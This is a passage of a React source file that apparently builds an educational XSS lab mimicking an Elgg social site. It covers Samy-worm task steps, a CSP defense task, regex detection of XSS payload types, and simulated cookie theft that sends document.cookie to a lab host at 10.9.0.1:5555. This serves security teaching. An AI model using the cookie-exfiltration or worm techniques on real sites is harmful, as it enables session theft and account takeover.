  <ol style="font-size:13px;line-height:1.8;color:#8b949e">
    <li>The worm reads its own code: <code>document.getElementById("worm").innerHTML</code></li>
    <li>Wraps it in a script tag with <code>id="worm"</code> again</li>
    <li>POSTs the entire payload to victim's profile</li>
    <li>Victim is now infected — their profile spreads to others</li>
    <li>Exponential spread: Samy → Alice → Charlie → ...</li>
  </ol>

  <h3>Critical: encodeURIComponent()</h3>
  <p style="font-size:11px;color:#8b949e;margin:8px 0;">Wrap the worm code in encodeURIComponent() — it escapes &lt;, &gt;, &quot;, &amp; characters.</p>

  <h3>Steps</h3>
  <ol style="font-size:13px;line-height:1.8;color:#8b949e">
    <li><strong>Login as samy</strong> → Edit Profile → About Me → ✓ Edit HTML</li>
    <li>Paste the Task 5 payload → Save</li>
    <li>Logout → <strong>Login as alice</strong> → Visit Samy (alice infected)</li>
    <li>Logout → <strong>Login as charlie</strong> → Visit <strong>Alice</strong> (charlie infected)</li>
    <li>✅ Check charlie's About Me — worm is there!</li>
  </ol>

  <p style="font-size:11px;color:#d29922;margin-top:12px;">📖 Historical: The 2005 Samy Worm infected 1 million MySpace profiles in 20 hours.</p>
  `
    },
    {
      id:'task6', number:6, title:'Task 6: Content Security Policy Defense', category:'Defense', xp:60,
      description:'Use CSP headers to block injected scripts.',
      hints:[
        'Put all domains on ONE script-src line.',
        'Nonce allows one trusted inline script.',
        'Answer CSP questions via the AI Mentor to earn XP.',
      ],
      content:`
  <h3>Objective</h3>
  <p>Learn how Content Security Policy prevents XSS by restricting script sources.</p>

  <h3>The Problem</h3>
  <p>HTML mixes data and code. Browsers can't distinguish attacker-injected scripts from legitimate ones.</p>

  <h3>The Solution: CSP</h3>
  <p>Tell the browser: "Only execute scripts from these trusted sources."</p>
  <div style="background:#0d1117;border:1px solid #30363d;border-radius:6px;padding:8px;margin:8px 0;font-family:monospace;font-size:10px;color:#79c0ff">Content-Security-Policy: script-src 'self' *.trusted.com</div>

  <h3>Key Rules</h3>
  <ul style="font-size:13px;line-height:1.8;color:#8b949e">
    <li><code>'self'</code> = same origin only</li>
    <li><code>*.trusted.com</code> = allow that domain</li>
    <li>⚠️ <strong>ONE script-src line</strong> — multiple lines = only last one works</li>
    <li>Nonce allows specific inline: <code>&lt;script nonce="xyz"&gt;</code></li>
  </ul>

  <div style="background:#064e3b;border:1px solid rgba(63,185,80,0.3);border-radius:6px;padding:10px;margin:12px 0;font-size:11px;color:#7ee8b8">
    📝 Answer CSP questions via the <strong>⚡ Quiz Me</strong> button to earn XP.
  </div>
  `
    },
  ];

  // ── UTILITIES ──────────────────────────────────────────────────────────────────
  function useLocalStorage(key, init) {
    const [v, setV] = useState(() => {
      try { const s = localStorage.getItem(key); return s ? JSON.parse(s) : init; } catch { return init; }
    });
    const set = (x) => { setV(x); try { localStorage.setItem(key, JSON.stringify(x)); } catch {} };
    return [v, set];
  }

  function makeSession(name, srn, branch) {
    const tasks = {};
    TASKS.forEach((t) => {
      tasks[t.id] = { started: true, completed:false, missionsCompleted:[] };
    });
    return { studentName:name, srn: srn||'', branch: branch||'', score:0, startedAt:Date.now(), currentTask:'task1', tasks };
  }

  // ── SRN → CONTAINER ID HELPER ─────────────────────────────────────────────────
  // PES1UG23AM203 → "AM203_Firstname" (suffix + first name)
  function srnToContainerId(srn, fullName) {
    if (!srn) return (fullName||'student').toLowerCase().replace(/\s+/g,'');
    const upper = srn.toUpperCase().trim();
    // Extract suffix: last 5 chars if pattern matches PES1UGxxXXXXX
    const match = upper.match(/[A-Z]{2}\d{3}$/);
    const suffix = match ? match[0] : upper.slice(-5);
    const firstName = (fullName||'Student').split(' ')[0];
    return `${suffix}_${firstName}`;
  }

  // ── XSS PAYLOAD DETECTION ─────────────────────────────────────────────────────
  function detectXssPayload(html) {
    if (!html || !/<script/i.test(html)) return null;
    const code = html.replace(/<script[^>]*>/gi,'').replace(/<\/script>/gi,'').trim();
    if (/document\.write/i.test(code) && /img/i.test(code)) return { type:'steal' };
    if (/img.*src.*cookie/i.test(code)) return { type:'steal' };
    if (/getElementById.*worm/i.test(code) || /id.*worm/i.test(html)) return { type:'worm' };
    if (/action\/friends\/add/i.test(code) || (/friends/i.test(code) && /add.*friend/i.test(code))) return { type:'friend' };
    if (/action\/profile\/edit|profile\/edit/i.test(code)) return { type:'profile' };
    if (/document\.cookie/i.test(code)) return { type:'cookie' };
    if (/alert\s*\(/i.test(code)) return { type:'alert' };
    return { type:'generic' };
  }

  // ── ELGG DESIGN TOKENS ────────────────────────────────────────────────────────
  const EG = {
    navBg:'#4a8fc2', navBg2:'#3a7ab0', navText:'#fff', navBorder:'#2d6a9f',
    pageBg:'#e8edf2', sidebarBg:'#fff', sidebarBdr:'#d0d8e0',
    contentBg:'#fff', contentBdr:'#d0d8e0',
    linkBlue:'#2b5f8e', linkHov:'#1a4a7a', btnBlue:'#4a8fc2', btnBlueDark:'#3a7ab0',
    btnGray:'#f0f2f4', btnGrayBdr:'#c0c8d0', labelGray:'#5a6a7a', labelDark:'#2a3a4a',
    inputBdr:'#b0bcc8', inputFocus:'#4a8fc2', sectionHdr:'#3a5a7a',
    sectionHdrBg:'#dce6f0', sectionHdrBdr:'#b8c8d8', mutedTxt:'#7a8a9a',
    red:'#cc3333', redBg:'#fdf0f0', redBdr:'#e8b0b0', green:'#2d7a2d', greenBg:'#f0fdf0',
  };
  const AVATAR_COLORS = {
    samy:{bg:'#d94f3d',txt:'#fff'}, alice:{bg:'#3d7dc9',txt:'#fff'},
    boby:{bg:'#5a9e5a',txt:'#fff'}, charlie:{bg:'#9b59b6',txt:'#fff'}, admin:{bg:'#e67e22',txt:'#fff'},
  };
  const USER_GUIDS = { samy:59, alice:56, boby:58, charlie:57, admin:1 };
  const USER_DISPLAY = { samy:'Samy', alice:'Alice', boby:'Boby', charlie:'Charlie', admin:'Admin' };

  function ElggAvatar({ user, size=36 }) {
    const col = AVATAR_COLORS[user] || { bg:'#888', txt:'#fff' };
    const initials = (USER_DISPLAY[user] || user).slice(0,2).toUpperCase();
    return (
      <div style={{ width:size, height:size, borderRadius:'50%', background:col.bg, color:col.txt, display:'flex', alignItems:'center', justifyContent:'center', fontWeight:700, fontSize:size*0.38, flexShrink:0, fontFamily:'Verdana,Geneva,sans-serif', userSelect:'none', border:'2px solid rgba(255,255,255,0.6)' }}>
        {initials}
      </div>
    );
  }

  function ElggWidget({ title, children }) {
    return (
      <div style={{ marginBottom:12 }}>
        <div style={{ background:EG.sectionHdrBg, border:`1px solid ${EG.sectionHdrBdr}`, borderBottom:'none', borderRadius:'4px 4px 0 0', padding:'6px 10px', fontSize:12, fontWeight:700, color:EG.sectionHdr, fontFamily:'Verdana,Geneva,sans-serif' }}>{title}</div>
        <div style={{ background:EG.sidebarBg, border:`1px solid ${EG.sectionHdrBdr}`, borderRadius:'0 0 4px 4px', padding:10 }}>{children}</div>
      </div>
    );
  }

  function ElggLink({ onClick, children, style={} }) {
    const [hov,setHov]=useState(false);
    return (
      <span onClick={onClick} onMouseEnter={()=>setHov(true)} onMouseLeave={()=>setHov(false)}
        style={{ color:hov?EG.linkHov:EG.linkBlue, cursor:'pointer', textDecoration:hov?'underline':'none', fontSize:12, fontFamily:'Verdana,Geneva,sans-serif', ...style }}>
        {children}
      </span>
    );
  }

  function ElggBtn({ onClick, children, variant='primary', small=false, style={} }) {
    const [hov,setHov]=useState(false);
    const isPrimary = variant==='primary';
    return (
      <button onClick={onClick} onMouseEnter={()=>setHov(true)} onMouseLeave={()=>setHov(false)}
        style={{ background:isPrimary?(hov?EG.btnBlueDark:EG.btnBlue):(hov?'#e8eaec':EG.btnGray), color:isPrimary?'#fff':EG.labelDark, border:`1px solid ${isPrimary?EG.navBorder:EG.btnGrayBdr}`, borderRadius:3, padding:small?'3px 10px':'5px 14px', cursor:'pointer', fontSize:small?11:12, fontFamily:'Verdana,Geneva,sans-serif', fontWeight:isPrimary?700:400, transition:'background 0.15s', ...style }}>
        {children}
      </button>
    );
  }

  function ElggEditorToolbar() {
    return (
      <div style={{ background:'#f0f0f0', border:'1px solid #bbb', borderBottom:'none', padding:'3px 4px', display:'flex', flexWrap:'wrap', gap:1, borderRadius:'3px 3px 0 0' }}>
        {['Bold','Italic','Underline','|','Link','Image','|','Undo','Redo'].map((t,i) => t==='|'
          ? <span key={i} style={{ borderLeft:'1px solid #bbb', height:18, margin:'2px 3px', alignSelf:'center' }} />
          : <span key={t} style={{ background:'#f5f5f5', border:'1px solid #ccc', borderRadius:2, padding:'2px 6px', cursor:'default', fontSize:11, fontFamily:'Verdana,Geneva,sans-serif', color:'#333', marginRight:2 }}>{t}</span>)}
        <span style={{ marginLeft:'auto', fontSize:10, color:'#888', alignSelf:'center', fontStyle:'italic' }}>TinyMCE</span>
      </div>
    );
  }

  // ── XSS ALERT MODAL ───────────────────────────────────────────────────────────
  function XssAlertModal({ payload, viewer, onClose }) {
    const fakeSession = viewer ? `Elgg=${btoa(viewer+':seedlab2024').slice(0,22)}; Path=/; HttpOnly` : 'Elgg=abc123xyz; Path=/; HttpOnly';
    const alertMsg = payload.type === 'cookie' ? fakeSession : 'XSS';
    return (
      <div style={{ position:'fixed', inset:0, background:'rgba(0,0,0,0.55)', display:'flex', alignItems:'center', justifyContent:'center', zIndex:9999 }}>
        <div style={{ background:'#f0f0f0', border:'2px solid #999', borderRadius:6, minWidth:360, maxWidth:500, boxShadow:'4px 4px 16px rgba(0,0,0,0.4)', fontFamily:'system-ui,-apple-system,sans-serif', overflow:'hidden' }}>
          <div style={{ background:'linear-gradient(to bottom,#e8e8e8,#d0d0d0)', borderBottom:'1px solid #bbb', padding:'6px 12px', display:'flex', alignItems:'center', justifyContent:'space-between' }}>
            <div style={{ display:'flex', alignItems:'center', gap:8 }}>
              <div style={{ width:14, height:14, borderRadius:'50%', background:'#fc615d' }} />
              <div style={{ width:14, height:14, borderRadius:'50%', background:'#fdbc40' }} />
              <div style={{ width:14, height:14, borderRadius:'50%', background:'#34c749' }} />
            </div>
            <span style={{ fontSize:12, fontWeight:600, color:'#444', flex:1, textAlign:'center', marginLeft:-42 }}>www.app.local says</span>
          </div>
          <div style={{ padding:'20px 24px 16px', background:'#fff' }}>
            <div style={{ display:'flex', gap:16, alignItems:'flex-start', marginBottom:16 }}>
              <div style={{ width:40, height:40, flexShrink:0, borderRadius:'50%', background:'#fff3e0', border:'2px solid #e8a000', display:'flex', alignItems:'center', justifyContent:'center', fontSize:22 }}>⚠️</div>
              <div>
                <div style={{ fontSize:12, color:C.muted, marginBottom:6 }}>The page at <strong style={{ color:C.red }}>www.app.local</strong> says:</div>
                <div style={{ background:payload.type==='cookie'?'#fdf6e3':'#fff8f8', border:`1px solid ${payload.type==='cookie'?'#e8c84a':'#f5a0a0'}`, borderRadius:4, padding:'10px 14px', fontFamily:"'Courier New',monospace", fontSize:payload.type==='cookie'?11:16, fontWeight:payload.type==='cookie'?400:700, color:payload.type==='cookie'?'#5a4a00':'#cc3333', wordBreak:'break-all', lineHeight:1.6 }}>
                  {alertMsg}
                </div>
                {payload.type==='cookie' && <div style={{ marginTop:8, padding:'6px 10px', background:'#fdf0f0', border:'1px solid #f5a0a0', borderRadius:4, fontSize:11, color:'#cc3333' }}>🚨 <strong>XSS SUCCESS:</strong> {viewer?`${viewer}'s`:"Victim's"} session cookie exposed!</div>}
                {payload.type==='alert' && <div style={{ marginTop:8, padding:'6px 10px', background:'#f0fdf0', border:'1px solid #a0e8a0', borderRadius:4, fontSize:11, color:'#1a6b1a' }}>✅ <strong>XSS Confirmed:</strong> Script executed in {viewer?`${viewer}'s`:"victim's"} browser context.</div>}
              </div>
            </div>
          </div>
          <div style={{ background:'#f0f0f0', borderTop:'1px solid #ccc', padding:'10px 16px', display:'flex', justifyContent:'flex-end' }}>
            <button onClick={onClose} style={{ background:'linear-gradient(to bottom,#f8f8f8,#e0e0e0)', border:'1px solid #aaa', borderRadius:4, padding:'5px 28px', fontSize:13, fontWeight:600, cursor:'pointer', fontFamily:'inherit', color:'#222' }}>OK</button>
          </div>
        </div>
      </div>
    );
  }

  // ── ABOUT ME RENDERER ─────────────────────────────────────────────────────────
  function AboutMeRenderer({ html, viewer, owner, onXssEvent, editHtmlUsed }) {
    const containerRef = useRef(null);
    const [modal, setModal] = useState(null);
    const firedRef = useRef(false);

    useEffect(() => { firedRef.current = false; }, [html, viewer]);

    useEffect(() => {
      if (!html || !containerRef.current) return;
      if (viewer === owner) {
        containerRef.current.innerHTML = html.replace(/<script\b[^<]*(?:(?!<\/script>)<[^<]*)*<\/script>/gi,'').trim();
        return;
      }
      if (!editHtmlUsed) {
        containerRef.current.innerHTML = html.replace(/<script\b[^<]*(?:(?!<\/script>)<[^<]*)*<\/script>/gi,'').trim();
        return;
      }
      containerRef.current.innerHTML = html;
      const payload = detectXssPayload(html);
      if (payload) {
        const timer = setTimeout(() => {
          if (firedRef.current) return;
          firedRef.current = true;
          if (payload.type === 'steal') {
            const studentId = window.__xssLabStudentId || 'default';
            const img1 = new Image(); img1.src = `http://localhost:3001/steal?c=${encodeURIComponent(document.cookie)}&student=${studentId}`; document.body.appendChild(img1);
            const img2 = new Image(); img2.src = `http://10.9.0.1:5555?c=${encodeURIComponent(document.cookie)}`; document.body.appendChild(img2);
            if (onXssEvent) onXssEvent('steal', viewer);
          } else if (payload.type === 'alert') { setModal('alert'); if (onXssEvent) onXssEvent('alert_triggered', viewer); }
          else if (payload.type === 'cookie') { setModal('cookie'); if (onXssEvent) onXssEvent('cookie_triggered', viewer); }
          else if (payload.type === 'friend') { if (onXssEvent) onXssEvent('friend', viewer); }
          else if (payload.type === 'profile') { if (onXssEvent) onXssEvent('profile', viewer); }
          else if (payload.type === 'worm') { if (onXssEvent) onXssEvent('worm', viewer, owner); }
          else { setModal(payload.type); if (onXssEvent) onXssEvent(payload.type, viewer); }
        }, 400);
        return () => clearTimeout(timer);
      }
    }, [html, viewer, owner, editHtmlUsed]);

    if (!html) return <span style={{ color:EG.mutedTxt, fontStyle:'italic', fontSize:12 }}>Nothing here yet</span>;
    const hasScript = html && /<script/i.test(html);
    return (
      <>
        {hasScript && editHtmlUsed && <div style={{ background:EG.redBg, border:`1px solid ${EG.redBdr}`, borderRadius:3, padding:'6px 10px', marginBottom:8, fontSize:11, color:EG.red, fontFamily:'Verdana,Geneva,sans-serif' }}>⚠️ <strong>XSS payload stored</strong> (via Edit HTML)</div>}
        {hasScript && !editHtmlUsed && <div style={{ background:'#fffde7', border:'1px solid #f9a825', borderRadius:3, padding:'6px 10px', marginBottom:8, fontSize:11, color:'#e65100', fontFamily:'Verdana,Geneva,sans-serif' }}>⚠️ Script found but <strong>Edit HTML was not used</strong> — TinyMCE would have sanitised this. Attack will NOT fire.</div>}
        <div ref={containerRef} style={{ fontSize:12, color:EG.labelDark, fontFamily:'Verdana,Geneva,sans-serif', lineHeight:1.6 }}></div>
        {modal==='alert' && <XssAlertModal payload={{ type:'alert' }} viewer={viewer} onClose={()=>setModal(null)} />}
        {modal==='cookie' && <XssAlertModal payload={{ type:'cookie' }} viewer={viewer} onClose={()=>setModal(null)} />}
      </>
    );
  }

  function BriefDescRenderer({ html, viewer, owner, onXssEvent }) {
    const containerRef = useRef(null);
    const [modal, setModal] = useState(null);
    const firedRef = useRef(false);
    useEffect(() => { firedRef.current = false; }, [html, viewer]);
    useEffect(() => {
      if (!html || !containerRef.current) return;
      if (viewer === owner) { containerRef.current.innerHTML = html.replace(/<script\b[^<]*(?:(?!<\/script>)<[^<]*)*<\/script>/gi,'').trim(); return; }
      containerRef.current.innerHTML = html;
      const payload = detectXssPayload(html);
      if (payload && (payload.type==='alert'||payload.type==='cookie')) {
        const timer = setTimeout(() => {
          if (firedRef.current) return; firedRef.current = true;
          if (onXssEvent) {
            if (payload.type === 'alert') onXssEvent('alert_triggered', viewer);
            else if (payload.type === 'cookie') onXssEvent('cookie_triggered', viewer);
          }
          if (payload.type === 'alert' || payload.type === 'cookie') setModal(payload.type);
        }, 400);
        return () => clearTimeout(timer);
      }
    }, [html, viewer, owner]);
    if (!html) return <span style={{ color:EG.mutedTxt, fontStyle:'italic', fontSize:12 }}>No description</span>;
    return (
      <>
        {/<script/i.test(html) && <div style={{ background:EG.redBg, border:`1px solid ${EG.redBdr}`, borderRadius:3, padding:'4px 8px', marginBottom:6, fontSize:10, color:EG.red }}>⚠️ XSS in description</div>}
        <div ref={containerRef} style={{ fontSize:11, color:EG.labelDark, fontFamily:'Verdana,Geneva,sans-serif', lineHeight:1.5, fontStyle:'italic' }}></div>
        {modal==='alert' && <XssAlertModal payload={{ type:'alert' }} viewer={viewer} onClose={()=>setModal(null)} />}
        {modal==='cookie' && <XssAlertModal payload={{ type:'cookie' }} viewer={viewer} onClose={()=>setModal(null)} />}
      </>
    );
  }

  // ── SOCIAL MEDIA PORTAL ───────────────────────────────────────────────────────
  function SocialMediaPortal({ onEvent, loggedIn, setLoggedIn, page, setPage, viewingProfile, setViewingProfile, profiles, setProfiles, lastPayloadOwner }) {
    const [editForm, setEditForm] = useState({ briefDesc:'', aboutMe:'' });
    const [editHtml, setEditHtml] = useState(false);
    const [memberSearch, setMemberSearch] = useState('');
    const sessionCookie = loggedIn ? `Elgg=${btoa(loggedIn+':seedlab2024').slice(0,22)}; Path=/; HttpOnly` : '';

    const handleVisitProfile = (user) => { if (!loggedIn) return; setViewingProfile(user); setPage('profile'); };

    const handleSaveProfile = async () => {
      const payloadTypeAboutMe = detectXssPayload(editForm.aboutMe);
      const payloadTypeBrief = detectXssPayload(editForm.briefDesc);
      setProfiles(prev => ({
        ...prev,
        [loggedIn]: { ...prev[loggedIn], briefDesc: editForm.briefDesc, aboutMe: editForm.aboutMe, aboutMeEditHtml: editHtml }
      }));
      setPage('profile'); setViewingProfile(loggedIn);
      try {
        const body = new URLSearchParams({ '__elgg_token':'lab_token_'+Date.now(), '__elgg_ts':Math.floor(Date.now()/1000), 'name':loggedIn, 'description':editForm.aboutMe, 'accesslevel[description]':'2', 'briefdescription':editForm.briefDesc, 'accesslevel[briefdescription]':'2', 'guid':USER_GUIDS[loggedIn] });
        const studentId = window.__xssLabStudentId || 'default';
        await fetch(`http://localhost:3001/elgg/action/profile/edit?student=${studentId}`, { method:'POST', headers:{'Content-Type':'application/x-www-form-urlencoded','X-Student-ID':studentId}, body:body.toString(), credentials:'include' });
      } catch {}
      if (payloadTypeBrief && onEvent) onEvent(payloadTypeBrief.type+'_stored', loggedIn);
      if (payloadTypeAboutMe && editHtml && onEvent) onEvent(payloadTypeAboutMe.type+'_stored', loggedIn);
    };

    const handleLogin = async (user, pass) => {
      const creds = { admin:'seedadmin', alice:'seedalice', boby:'seedboby', charlie:'seedcharlie', samy:'seedsamy' };
      if (creds[user] === pass) {
        setLoggedIn(user); setPage('home');
        const sessionToken = btoa(user+':seedlab2024').slice(0,22);
        document.cookie = `Elgg=${sessionToken}; path=/; SameSite=Lax`;
        try {
          const studentId = window.__xssLabStudentId || 'default';
          const body = new URLSearchParams({ username:user, password:pass });
          await fetch(`http://localhost:3001/elgg/action/login?student=${studentId}`, { method:'POST', headers:{'Content-Type':'application/x-www-form-urlencoded','X-Student-ID':studentId}, body:body.toString(), credentials:'include' });
        } catch {}
      }
    };

    const handleXssEvent = useCallback((type, viewer, source) => {
      const studentId = window.__xssLabStudentId || 'default';
      if (type === 'friend' && viewer !== 'samy') {
        setProfiles(prev => ({ ...prev, [viewer]: { ...prev[viewer], friends:[...new Set([...(prev[viewer]?.friends||[]),'samy'])] } }));
        const ts = Date.now(); const token = "lab_token_"+ts;
        fetch(`http://localhost:3001/elgg/action/friends/add?friend=59&__elgg_ts=${ts}&__elgg_token=${token}&student=${studentId}`, { method:'GET', credentials:'include', headers:{'X-Student-ID':studentId} }).catch(()=>{});
      } else if (type === 'profile' && viewer !== 'samy') {
        setProfiles(prev => ({ ...prev, [viewer]: { ...prev[viewer], aboutMe:'<p style="color:#cc3333"><strong>Samy is my hero!</strong></p>', briefDesc:'Samy is my hero!', aboutMeEditHtml:true } }));
        const ts = Date.now(); const token = "lab_token_"+ts;
        const body = new URLSearchParams({ '__elgg_token':token,'__elgg_ts':String(ts),'name':viewer,'description':'Samy is my hero!','accesslevel[description]':'2','guid':String(USER_GUIDS[viewer]||56) });
        fetch(`http://localhost:3001/elgg/action/profile/edit?student=${studentId}`, { method:'POST', credentials:'include', headers:{'Content-Type':'application/x-www-form-urlencoded','X-Student-ID':studentId}, body:body.toString() }).catch(()=>{});
      } else if (type === 'worm' && viewer !== 'samy') {
        setProfiles(prev => {
          const wormOwner = source || 'samy';
          const wormCode = prev[wormOwner]?.aboutMe || '';
          return { ...prev, [viewer]: { ...prev[viewer], aboutMe:wormCode, aboutMeEditHtml:true, friends:[...new Set([...(prev[viewer]?.friends||[]),'samy'])] } };
        });
        const ts = Date.now(); const token = "lab_token_"+ts;
        const body = new URLSearchParams({ '__elgg_token':token,'__elgg_ts':String(ts),'name':viewer,'description':'[worm-self-replica]','briefdescription':'samy is my hero','accesslevel[description]':'2','accesslevel[briefdescription]':'2','guid':String(USER_GUIDS[viewer]||56) });
        fetch(`http://localhost:3001/elgg/action/profile/edit?student=${studentId}`, { method:'POST', credentials:'include', headers:{'Content-Type':'application/x-www-form-urlencoded','X-Student-ID':studentId}, body:body.toString() }).catch(()=>{});
      }
      if (onEvent) onEvent(type, viewer, source);
    }, [onEvent]);

    const allUsers = ['samy','alice','boby','charlie'];
    const filteredUsers = allUsers.filter(u => u.includes(memberSearch.toLowerCase()) || USER_DISPLAY[u].toLowerCase().includes(memberSearch.toLowerCase()));
    const resetProfiles = () => {
      if (window.confirm('Reset all Elgg profiles to clean state?')) {
        setProfiles({ samy:{briefDesc:'',aboutMe:'',aboutMeEditHtml:false,friends:[],posts:[]}, alice:{briefDesc:'',aboutMe:'',aboutMeEditHtml:false,friends:[],posts:[]}, boby:{briefDesc:'',aboutMe:'',aboutMeEditHtml:false,friends:[],posts:[]}, charlie:{briefDesc:'',aboutMe:'',aboutMeEditHtml:false,friends:[],posts:[]} });
        setPage('home'); setViewingProfile(null);
      }
    };

    if (!loggedIn) return <ElggLoginForm onLogin={handleLogin} />;

    return (
      <div style={{ background:EG.pageBg, borderRadius:8, overflow:'hidden', border:`1px solid ${EG.contentBdr}`, fontFamily:'Verdana,Geneva,sans-serif', minHeight:520 }}>
        {/* NAV */}
        <div style={{ background:EG.navBg, borderBottom:`2px solid ${EG.navBorder}` }}>
          <div style={{ display:'flex', alignItems:'center', justifyContent:'space-between', padding:'8px 14px' }}>
            <div style={{ display:'flex', alignItems:'center', gap:10 }}>
              <div style={{ background:'#fff', borderRadius:3, padding:'2px 8px', cursor:'pointer' }} onClick={()=>setPage('home')}>
                <span style={{ fontSize:18, fontWeight:900, color:'#e67e00', letterSpacing:-1, fontFamily:'Georgia,serif' }}>elgg</span>
              </div>
              <span style={{ color:C.text, fontSize:10 }}>www.app.local</span>
            </div>
            <div style={{ display:'flex', alignItems:'center', gap:10 }}>
              <div style={{ display:'flex', alignItems:'center', background:`${C.bg}30`, border:`1px solid ${C.border}50`, borderRadius:3, padding:'3px 8px', gap:5 }}>
                <span style={{ color:C.text, fontSize:11 }}>🔍</span>
                <input placeholder="Search..." onChange={e=>setMemberSearch(e.target.value)} style={{ background:'transparent', border:'none', outline:'none', color:C.text, fontSize:11, width:120, fontFamily:'Verdana,Geneva,sans-serif' }} />
              </div>
              <div style={{ display:'flex', alignItems:'center', gap:6 }}>
                <ElggAvatar user={loggedIn} size={26} />
                <div style={{ display:'flex', flexDirection:'column' }}>
                  <span style={{ color:C.text, fontSize:11, fontWeight:700, lineHeight:1.2 }}>{USER_DISPLAY[loggedIn]}</span>
                  <div style={{ display:'flex', gap:8, alignItems:'center' }}>
                    <ElggLink onClick={()=>{ setLoggedIn(null); setPage('home'); setViewingProfile(null); }} style={{ color:C.text, fontSize:10 }}>Log out</ElggLink>
                    <button onClick={resetProfiles} style={{ background:'rgba(248,81,73,0.1)', border:'1px solid rgba(248,81,73,0.3)', color:'#f85149', borderRadius:3, padding:'2px 8px', fontSize:9, cursor:'pointer', fontFamily:'Verdana,Geneva,sans-serif' }}>🔄 Reset</button>
                  </div>
                </div>
              </div>
            </div>
          </div>
          <div style={{ display:'flex', padding:'0 14px', gap:2 }}>
            {[{id:'home',label:'Dashboard'},{id:'myprofile',label:'Profile'},{id:'members',label:'Members'},{id:'activity',label:'Activity'}].map(tab => {
              const isActive = tab.id===page||(tab.id==='myprofile'&&page==='profile'&&viewingProfile===loggedIn);
              return (
                <button key={tab.id} onClick={()=>{ if(tab.id==='myprofile'){setViewingProfile(loggedIn);setPage('profile');}else if(tab.id==='members')setPage('members');else setPage(tab.id); }}
                  style={{ background:isActive?'#fff':'transparent', border:'none', borderRadius:'3px 3px 0 0', color:isActive?EG.navBg:'rgba(255,255,255,0.85)', padding:'5px 14px', cursor:'pointer', fontSize:12, fontWeight:isActive?700:400, fontFamily:'Verdana,Geneva,sans-serif' }}
                  onMouseEnter={e=>!isActive&&(e.currentTarget.style.background='rgba(255,255,255,0.15)')}
                  onMouseLeave={e=>!isActive&&(e.currentTarget.style.background='transparent')}>
                  {tab.label}
                </button>
              );
            })}
          </div>
        </div>

        <div style={{ display:'flex', gap:0, padding:12, alignItems:'flex-start' }}>
          {/* SIDEBAR */}
          <div style={{ width:170, flexShrink:0, marginRight:12 }}>
            <ElggWidget title="Members">
              {filteredUsers.map(u => (
                <div key={u} style={{ display:'flex', alignItems:'center', gap:7, marginBottom:8, cursor:'pointer' }} onClick={()=>handleVisitProfile(u)}>
                  <ElggAvatar user={u} size={28} />
                  <div>
                    <ElggLink onClick={()=>handleVisitProfile(u)} style={{ display:'block', fontWeight:700 }}>{USER_DISPLAY[u]}</ElggLink>
                    <span style={{ fontSize:10, color:EG.mutedTxt }}>guid: {USER_GUIDS[u]}</span>
                  </div>
                </div>
              ))}
            </ElggWidget>
            <ElggWidget title="Lab Info">
              <div style={{ fontSize:10, color:EG.labelDark, lineHeight:1.7 }}>
                <div><strong>Host:</strong> 10.9.0.5</div>
                <div><strong>User:</strong> {loggedIn} (guid: {USER_GUIDS[loggedIn]})</div>
                <div style={{ marginTop:4 }}><strong>Cookie:</strong></div>
                <div style={{ fontFamily:'monospace', wordBreak:'break-all', color:EG.red, fontSize:9 }}>{sessionCookie.slice(0,40)}…</div>
              </div>
            </ElggWidget>
          </div>

          {/* MAIN */}
          <div style={{ flex:1, minWidth:0 }}>
            {page==='home' && (
              <div>
                <div style={{ background:EG.contentBg, border:`1px solid ${EG.contentBdr}`, borderRadius:4, padding:'10px 14px', marginBottom:12 }}>
                  <div style={{ display:'flex', alignItems:'center', gap:10, marginBottom:10 }}>
                    <ElggAvatar user={loggedIn} size={48} />
                    <div>
                      <div style={{ fontSize:16, fontWeight:700, color:EG.labelDark }}>{USER_DISPLAY[loggedIn]}</div>
                      <ElggLink onClick={()=>{ setViewingProfile(loggedIn); setPage('profile'); }}>View my profile</ElggLink>{' · '}
                      <ElggLink onClick={()=>{ setEditForm({ briefDesc:profiles[loggedIn]?.briefDesc||'', aboutMe:profiles[loggedIn]?.aboutMe||'' }); setEditHtml(false); setPage('edit'); }}>Edit profile</ElggLink>
                    </div>
                  </div>
                  <div style={{ borderTop:`1px solid ${EG.contentBdr}`, paddingTop:10, fontSize:12, color:EG.mutedTxt }}>
                    Login as <strong>samy</strong> → Edit Profile → About Me → <strong>tick "Edit HTML"</strong> → paste payload → Save. Then login as a victim and visit Samy's profile.
                  </div>
                </div>
                <ElggWidget title="Activity River">
                  {allUsers.map(u => {
                    const p = profiles[u]; const hasScript = /<script/i.test(p?.aboutMe||'') || /<script/i.test(p?.briefDesc||'');
                    if (!p?.briefDesc && !hasScript) return null;
                    return (
                      <div key={u} style={{ display:'flex', gap:8, marginBottom:10, paddingBottom:10, borderBottom:`1px solid ${EG.sectionHdrBdr}` }}>
                        <ElggAvatar user={u} size={32} />
                        <div style={{ flex:1 }}>
                          <div style={{ fontSize:12 }}>
                            <ElggLink onClick={()=>handleVisitProfile(u)} style={{ fontWeight:700 }}>{USER_DISPLAY[u]}</ElggLink>
                            {hasScript ? <span style={{ color:EG.red }}> updated profile <strong>[⚠️ XSS payload stored]</strong></span>
                              : <span style={{ color:EG.labelDark }}> updated brief description</span>}
                          </div>
                          <div style={{ fontSize:10, color:EG.mutedTxt, marginTop:2 }}>just now</div>
                        </div>
                      </div>
                    );
                  })}
                  <div style={{ fontSize:11, color:EG.mutedTxt, textAlign:'center' }}>Click a member name to visit their profile</div>
                </ElggWidget>
              </div>
            )}

            {page==='members' && (
              <ElggWidget title={`Members (${filteredUsers.length})`}>
                <div style={{ display:'grid', gridTemplateColumns:'1fr 1fr', gap:10 }}>
                  {filteredUsers.map(u => (
                    <div key={u} style={{ background:EG.pageBg, border:`1px solid ${EG.contentBdr}`, borderRadius:4, padding:10 }}>
                      <div style={{ display:'flex', alignItems:'center', gap:8, marginBottom:6 }}>
                        <ElggAvatar user={u} size={40} />
                        <div>
                          <ElggLink onClick={()=>handleVisitProfile(u)} style={{ fontWeight:700, fontSize:13 }}>{USER_DISPLAY[u]}</ElggLink>
                          <div style={{ fontSize:10, color:EG.mutedTxt }}>guid: {USER_GUIDS[u]}</div>
                        </div>
                      </div>
                      <div style={{ marginTop:6 }}><ElggBtn small onClick={()=>handleVisitProfile(u)}>View Profile</ElggBtn></div>
                    </div>
                  ))}
                </div>
              </ElggWidget>
            )}

            {page==='profile' && viewingProfile && (() => {
              const p = profiles[viewingProfile];
              const isOwn = viewingProfile === loggedIn;
              const ownerFriends = p?.friends || [];
              return (
                <div>
